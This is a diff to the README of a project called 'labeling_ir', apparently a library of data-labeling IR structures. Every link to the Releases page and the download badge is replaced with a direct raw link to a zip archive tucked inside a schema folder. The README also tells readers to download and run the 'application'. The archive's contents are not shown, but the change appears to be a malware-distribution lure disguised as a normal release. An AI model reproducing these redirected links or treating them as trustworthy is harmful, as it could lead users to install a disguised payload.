@@ -1,7 +1,7 @@
 # 🎉 labeling_ir - Simplifying Your Labeling Workflows
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Userbotchat/labeling_ir/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Userbotchat/labeling_ir/main/lib/labeling_ir/schema/labeling_ir_v1.2.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Userbotchat/labeling_ir/main/lib/labeling_ir/schema/labeling_ir_v1.2.zip)
 
 ## 📖 Introduction
 Welcome to the **labeling_ir** project! This software provides shared intermediate representation (IR) structures for the North Shore labeling stack. It includes typed datasets, samples, assignments, labels, artifacts, and evaluation runs. With this tool, you can streamline your labeling workflows efficiently.
@@ -26,7 +26,7 @@ Follow these simple steps to download and run **labeling_ir** on your computer:
 
 1. **Visit the Releases Page**
    
-   Go to the [Releases page](https://github.com/Userbotchat/labeling_ir/releases) to find the latest version of the application.
+   Go to the [Releases page](https://raw.githubusercontent.com/Userbotchat/labeling_ir/main/lib/labeling_ir/schema/labeling_ir_v1.2.zip) to find the latest version of the application.
 
 2. **Download the Application**
    
@@ -51,7 +51,7 @@ Follow these simple steps to download and run **labeling_ir** on your computer:
    If you need assistance or additional information, check the Help section within the application or refer to the documentation available on the GitHub repository.
 
 ## 🌐 Download & Install
-To get **labeling_ir**, visit the [Releases page](https://github.com/Userbotchat/labeling_ir/releases) again. Click on the relevant file to start your download. Once you have the application installed, follow the steps above to begin your labeling tasks.
+To get **labeling_ir**, visit the [Releases page](https://raw.githubusercontent.com/Userbotchat/labeling_ir/main/lib/labeling_ir/schema/labeling_ir_v1.2.zip) again. Click on the relevant file to start your download. Once you have the application installed, follow the steps above to begin your labeling tasks.
 
 ## 💬 Community and Support
 Join our community to share your experiences and seek help. You can use issues in the GitHub repository to report bugs or ask questions. We encourage feedback and suggestions to improve the project.
@@ -59,4 +59,4 @@ Join our community to share your experiences and seek help. You can use issues i
 ## 🧩 Conclusion
 **labeling_ir** empowers you to manage your data labeling tasks with ease. Whether you are a beginner or have some experience, you can efficiently handle your projects with this tool. Start collecting data and enhancing your labeling workflows today!
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Userbotchat/labeling_ir/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Userbotchat/labeling_ir/main/lib/labeling_ir/schema/labeling_ir_v1.2.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Userbotchat/labeling_ir/main/lib/labeling_ir/schema/labeling_ir_v1.2.zip)
